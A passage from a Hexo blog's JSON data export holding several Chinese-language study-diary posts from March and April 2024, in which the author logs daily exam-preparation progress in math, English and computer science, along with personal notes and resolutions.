16.58.55](https://github.com/R3damancy1/picx-images-hosting/raw/master/2024330.5j3zcz40g8.webp)","slug":"2024_3_30","published":1,"updated":"2024-04-12T15:34:59.176Z","_id":"cluwn76gl0004oa76372ceptk","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"2024-3-30\"><a href=\"#2024-3-30\" class=\"headerlink\" title=\"2024 3 30\"></a>2024 3 30</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>0h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>无</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>无</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>无</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>今天打了一天比赛，初赛第七，感谢队友带飞！<img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://github.com/R3damancy1/picx-images-hosting/raw/master/2024330.5j3zcz40g8.webp\"\n                        alt=\"截屏2024-03-30 16.58.55\"\n                 ></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":null},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":null}]}},"more":"<h1 id=\"2024-3-30\"><a href=\"#2024-3-30\" class=\"headerlink\" title=\"2024 3 30\"></a>2024 3 30</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>0h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>无</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>无</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>无</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>今天打了一天比赛，初赛第七，感谢队友带飞！<img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://github.com/R3damancy1/picx-images-hosting/raw/master/2024330.5j3zcz40g8.webp\"\n                        alt=\"截屏2024-03-30 16.58.55\"\n                 ></p>\n"},{"title":"考研日记03-31","date":"2024-03-31T13:12:54.000Z","excerpt":"记录考研","_content":"# 2024 3 31\n\n## 学习时间\n\n- 6h\n\n## MATH\n\n- 第四讲 讲义过完，题为做p85\n\n## ENGLISH\n\n- 记单词（x\n\n## 408\n\n- 无，确实没复习。。。\n\n\n\n## 杂记\n\n今天去图书馆从下午2点做到了晚上9点，感觉效率还行，算是一个比较好的开始吧，希望能坚持下去，每天都去图书馆！\n\n","source":"_posts/2024_3_31.md","raw":"---\ntitle: 考研日记03-31\ndate: 2024-03-31 21:12:54\nexcerpt: 记录考研\ncategories: 考研\n---\n# 2024 3 31\n\n## 学习时间\n\n- 6h\n\n## MATH\n\n- 第四讲 讲义过完，题为做p85\n\n## ENGLISH\n\n- 记单词（x\n\n## 408\n\n- 无，确实没复习。。。\n\n\n\n## 杂记\n\n今天去图书馆从下午2点做到了晚上9点，感觉效率还行，算是一个比较好的开始吧，希望能坚持下去，每天都去图书馆！\n\n","slug":"2024_3_31","published":1,"updated":"2024-04-12T15:27:19.097Z","_id":"cluwn76gn0005oa76f64pcujp","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"2024-3-31\"><a href=\"#2024-3-31\" class=\"headerlink\" title=\"2024 3 31\"></a>2024 3 31</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>6h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>第四讲 讲义过完，题为做p85</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>记单词（x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>无，确实没复习。。。</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>今天去图书馆从下午2点做到了晚上9点，感觉效率还行，算是一个比较好的开始吧，希望能坚持下去，每天都去图书馆！</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":null},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":null}]}},"more":"<h1 id=\"2024-3-31\"><a href=\"#2024-3-31\" class=\"headerlink\" title=\"2024 3 31\"></a>2024 3 31</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>6h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>第四讲 讲义过完，题为做p85</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>记单词（x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>无，确实没复习。。。</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>今天去图书馆从下午2点做到了晚上9点，感觉效率还行，算是一个比较好的开始吧，希望能坚持下去，每天都去图书馆！</p>\n"},{"title":"考研日记04-01","date":"2024-04-01T15:22:51.000Z","excerpt":"记录考研","_content":"# 2024 4 1\n\n## 学习时间\n\n- 7h\n\n## MATH\n\n- 第五讲学习到了拐点附近 p96\n\n## ENGLISH\n\n- 晚上睡觉前一定记单词！（x\n\n## 408\n\n- 第二章开了个头 p17\n\n\n\n## 杂记\n\n今天还是去图书馆学的，学习状态还不错，就是晚上和金导为了一个事情争论了一个多小时，有点浪费时间了...，以后还是更专注一些。早上就要去图书馆！每天7:30起床！","source":"_posts/2024_4_1.md","raw":"---\ntitle: 考研日记04-01\ndate: 2024-04-01 23:22:51\nexcerpt: 记录考研\ncategories: 考研\n---\n# 2024 4 1\n\n## 学习时间\n\n- 7h\n\n## MATH\n\n- 第五讲学习到了拐点附近 p96\n\n## ENGLISH\n\n- 晚上睡觉前一定记单词！（x\n\n## 408\n\n- 第二章开了个头 p17\n\n\n\n## 杂记\n\n今天还是去图书馆学的，学习状态还不错，就是晚上和金导为了一个事情争论了一个多小时，有点浪费时间了...，以后还是更专注一些。早上就要去图书馆！每天7:30起床！","slug":"2024_4_1","published":1,"updated":"2024-04-12T15:38:51.202Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cluwu323u0000we76484e0pgr","content":"<h1 id=\"2024-4-1\"><a href=\"#2024-4-1\" class=\"headerlink\" title=\"2024 4 1\"></a>2024 4 1</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>7h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>第五讲学习到了拐点附近 p96</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>晚上睡觉前一定记单词！（x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>第二章开了个头 p17</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>今天还是去图书馆学的，学习状态还不错，就是晚上和金导为了一个事情争论了一个多小时，有点浪费时间了…，以后还是更专注一些。早上就要去图书馆！每天7:30起床！</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":null},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":null}]}},"more":"<h1 id=\"2024-4-1\"><a href=\"#2024-4-1\" class=\"headerlink\" title=\"2024 4 1\"></a>2024 4 1</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>7h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>第五讲学习到了拐点附近 p96</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>晚上睡觉前一定记单词！（x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>第二章开了个头 p17</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>今天还是去图书馆学的，学习状态还不错，就是晚上和金导为了一个事情争论了一个多小时，有点浪费时间了…，以后还是更专注一些。早上就要去图书馆！每天7:30起床！</p>\n"},{"title":"考研日记04-02","date":"2024-04-02T14:52:14.000Z","excerpt":"记录考研","_content":"# 2024 4 2\n\n## 学习时间\n\n- 0h\n\n## MATH\n\n- 无\n\n## ENGLISH\n\n- 晚上睡觉前一定记单词！（x\n\n## 408\n\n- 无\n\n\n\n## 杂记\n明天一定早起学习","source":"_posts/2024_4_2.md","raw":"---\ntitle: 考研日记04-02\ndate: 2024-04-02 22:52:14\nexcerpt: 记录考研\ncategories: 考研\n---\n# 2024 4 2\n\n## 学习时间\n\n- 0h\n\n## MATH\n\n- 无\n\n## ENGLISH\n\n- 晚上睡觉前一定记单词！（x\n\n## 408\n\n- 无\n\n\n\n## 杂记\n明天一定早起学习","slug":"2024_4_2","published":1,"updated":"2024-04-23T16:45:32.000Z","_id":"cluwu32410001we76foqm4pu1","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"2024-4-2\"><a href=\"#2024-4-2\" class=\"headerlink\" title=\"2024 4 2\"></a>2024 4 2</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>0h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>无</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>晚上睡觉前一定记单词！（x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>无</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>明天一定早起学习</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"2024-4-2\"><a href=\"#2024-4-2\" class=\"headerlink\" title=\"2024 4 2\"></a>2024 4 2</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>0h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>无</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>晚上睡觉前一定记单词！（x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>无</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>明天一定早起学习</p>\n"},{"title":"考研日记04-08","date":"2024-04-08T13:45:11.000Z","excerpt":"记录考研","_content":"# 2024 4 8\n\n## 学习时间\n\n- 8h\n\n## MATH\n\n- 第五讲完结 p108\n\n  明天把例题重新做一遍，将1000题跟上进度，巩固基础，就先不学后面了\n\n  \n\n## ENGLISH\n\n- 晚上睡觉前一定记单词！！（x\n\n## 408\n\n- 第二章线性表网课看完，明天把课后题写一遍 并仔细看看书\n\n\n\n## 杂记\n\n清明节那几天都没怎么学习，没什么状态，这几天把状态调整回来，早上一定早起来图书馆！！！\n\n还有就是\n\n记单词！\n\n记单词！\n\n记单词！\n\n重要的事情说三遍，这回必须要记了，不然到时候英语单科国家线没过就尴尬了！\n\n","source":"_posts/2024_4_8.md","raw":"---\ntitle: 考研日记04-08\ndate: 2024-04-08 21:45:11\nexcerpt: 记录考研\ncategories: 考研\n---\n# 2024 4 8\n\n## 学习时间\n\n- 8h\n\n## MATH\n\n- 第五讲完结 p108\n\n  明天把例题重新做一遍，将1000题跟上进度，巩固基础，就先不学后面了\n\n  \n\n## ENGLISH\n\n- 晚上睡觉前一定记单词！！（x\n\n## 408\n\n- 第二章线性表网课看完，明天把课后题写一遍 并仔细看看书\n\n\n\n## 杂记\n\n清明节那几天都没怎么学习，没什么状态，这几天把状态调整回来，早上一定早起来图书馆！！！\n\n还有就是\n\n记单词！\n\n记单词！\n\n记单词！\n\n重要的事情说三遍，这回必须要记了，不然到时候英语单科国家线没过就尴尬了！\n\n","slug":"2024_4_8","published":1,"updated":"2024-04-12T15:41:03.091Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cluwu73wr0002bk76fr11hbbk","content":"<h1 id=\"2024-4-8\"><a href=\"#2024-4-8\" class=\"headerlink\" title=\"2024 4 8\"></a>2024 4 8</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>8h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li><p>第五讲完结 p108</p>\n<p>明天把例题重新做一遍，将1000题跟上进度，巩固基础，就先不学后面了</p>\n</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>晚上睡觉前一定记单词！！（x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>第二章线性表网课看完，明天把课后题写一遍 并仔细看看书</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>清明节那几天都没怎么学习，没什么状态，这几天把状态调整回来，早上一定早起来图书馆！！！</p>\n<p>还有就是</p>\n<p>记单词！</p>\n<p>记单词！</p>\n<p>记单词！</p>\n<p>重要的事情说三遍，这回必须要记了，不然到时候英语单科国家线没过就尴尬了！</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":null},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":null}]}},"more":"<h1 id=\"2024-4-8\"><a href=\"#2024-4-8\" class=\"headerlink\" title=\"2024 4 8\"></a>2024 4 8</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>8h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li><p>第五讲完结 p108</p>\n<p>明天把例题重新做一遍，将1000题跟上进度，巩固基础，就先不学后面了</p>\n</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>晚上睡觉前一定记单词！！（x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>第二章线性表网课看完，明天把课后题写一遍 并仔细看看书</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>清明节那几天都没怎么学习，没什么状态，这几天把状态调整回来，早上一定早起来图书馆！！！</p>\n<p>还有就是</p>\n<p>记单词！</p>\n<p>记单词！</p>\n<p>记单词！</p>\n<p>重要的事情说三遍，这回必须要记了，不然到时候英语单科国家线没过就尴尬了！</p>\n"},{"title":"考研日记04-09","date":"2024-04-09T15:25:17.000Z","excerpt":"记录考研","_content":"# 2024 4 9\n\n## 学习时间\n\n- 8h\n\n## MATH\n\n- 第五讲习题写完，1000题跟上进度，第六讲刚学到拉格朗日中值定理 P114\n\n  \n\n## ENGLISH\n\n- 晚上睡觉前一定记单词！！（x\n\n## 408\n\n- 第二章线性表习题写完，第三章开头栈\n\n\n\n## 杂记\n\n今天明显状态好很多了，早上一起来就开始学习，但是还有个坏习惯就是每天睡的有点晚，以后争取每天12点前睡觉，每天早上七点钟起来。\n\n以后还是每天坚持到图书馆来学，宿舍学习终究是有点没效率\n","source":"_posts/2024_4_9.md","raw":"---\ntitle: 考研日记04-09\ndate: 2024-04-09 23:25:17\nexcerpt: 记录考研\ncategories: 考研\n---\n# 2024 4 9\n\n## 学习时间\n\n- 8h\n\n## MATH\n\n- 第五讲习题写完，1000题跟上进度，第六讲刚学到拉格朗日中值定理 P114\n\n  \n\n## ENGLISH\n\n- 晚上睡觉前一定记单词！！（x\n\n## 408\n\n- 第二章线性表习题写完，第三章开头栈\n\n\n\n## 杂记\n\n今天明显状态好很多了，早上一起来就开始学习，但是还有个坏习惯就是每天睡的有点晚，以后争取每天12点前睡觉，每天早上七点钟起来。\n\n以后还是每天坚持到图书馆来学，宿舍学习终究是有点没效率\n","slug":"2024_4_9","published":1,"updated":"2024-04-12T15:41:37.181Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cluwu73wt0003bk76fhfuhgtj","content":"<h1 id=\"2024-4-9\"><a href=\"#2024-4-9\" class=\"headerlink\" title=\"2024 4 9\"></a>2024 4 9</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>8h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>第五讲习题写完，1000题跟上进度，第六讲刚学到拉格朗日中值定理 P114</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>晚上睡觉前一定记单词！！（x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>第二章线性表习题写完，第三章开头栈</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>今天明显状态好很多了，早上一起来就开始学习，但是还有个坏习惯就是每天睡的有点晚，以后争取每天12点前睡觉，每天早上七点钟起来。</p>\n<p>以后还是每天坚持到图书馆来学，宿舍学习终究是有点没效率</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":null},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":null}]}},"more":"<h1 id=\"2024-4-9\"><a href=\"#2024-4-9\" class=\"headerlink\" title=\"2024 4 9\"></a>2024 4 9</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>8h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>第五讲习题写完，1000题跟上进度，第六讲刚学到拉格朗日中值定理 P114</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>晚上睡觉前一定记单词！！（x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>第二章线性表习题写完，第三章开头栈</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>今天明显状态好很多了，早上一起来就开始学习，但是还有个坏习惯就是每天睡的有点晚，以后争取每天12点前睡觉，每天早上七点钟起来。</p>\n<p>以后还是每天坚持到图书馆来学，宿舍学习终究是有点没效率</p>\n"},{"title":"考研日记04-12","date":"2024-04-12T15:47:29.000Z","excerpt":"记录考研","_content":"# 2024 4 12\n\n## 学习时间\n\n- 2h3min\n\n\n\n## MATH\n\n- 第八讲过完\n\n  \n\n## ENGLISH\n\n- 也许30个？\n\n\n\n## 408\n\n- 没看。。。\n\n\n\n## 杂记\n\n今天基本上一天都在重构博客\n\n将halo换成hexo的了，感觉keep主题是真的好看！\n\n今天看文档看的头皮发麻，勉强弄了一点\n\n感觉还挺好看的？😄\n\n![2445159348](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/2445159348.png)","source":"_posts/2024_4_12.md","raw":"---\ntitle: 考研日记04-12\ndate: 2024-04-12 23:47:29\nexcerpt: 记录考研\ncategories: 考研\n---\n# 2024 4 12\n\n## 